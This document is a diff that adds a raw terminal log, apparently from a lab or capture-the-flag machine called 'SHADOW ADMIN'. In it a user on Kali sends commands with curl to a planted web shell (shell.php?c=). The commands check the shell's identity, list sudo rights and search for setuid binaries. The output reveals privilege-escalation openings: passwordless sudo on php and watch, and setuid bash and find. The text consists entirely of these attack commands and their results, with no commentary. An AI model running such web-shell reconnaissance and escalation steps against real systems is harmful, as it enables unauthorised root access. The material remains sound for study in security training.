@@ -1,0 +1,39 @@
+chifay@kali:~/SHADOW ADMIN$ curl -sS "http://172.17.0.2/shell.php?c=id"
+
+<pre>uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)
+</pre>
+chifay@kali:~/SHADOW ADMIN$ curl -sS --get --data-urlencode "c=sudo -n -l" http://172.17.0.2/shell.php
+
+<pre>Matching Defaults entries for admin on shadowadmin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on shadowadmin:
+    (ALL) ALL
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/php /var/www/html/shell.php
+    (ALL) NOPASSWD: /usr/bin/watch
+</pre>
+chifay@kali:~/SHADOW ADMIN$ curl -sS --get --data-urlencode "c=find / -perm -4000 -type f 2>/dev/null" http://172.17.0.2/shell.php
+
+<pre>/bin/su
+/bin/bash
+/bin/mount
+/bin/umount
+/usr/bin/watch
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/find
+/usr/bin/chsh
+/usr/bin/sudo
+</pre>
+chifay@kali:~/SHADOW ADMIN$ curl -sS --get --data-urlencode "c=ls -l /usr/bin/find /bin/bash /usr/bin/watch" http://172.17.0.2/shell.php
+
+<pre>-rwsr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
+-rwsr-xr-x 1 root root  221768 Feb  7  2016 /usr/bin/find
+-rwsr-xr-x 1 root root   23696 Mar  5  2020 /usr/bin/watch
+</pre>
+chifay@kali:~/SHADOW ADMIN$ exit
+
+exit
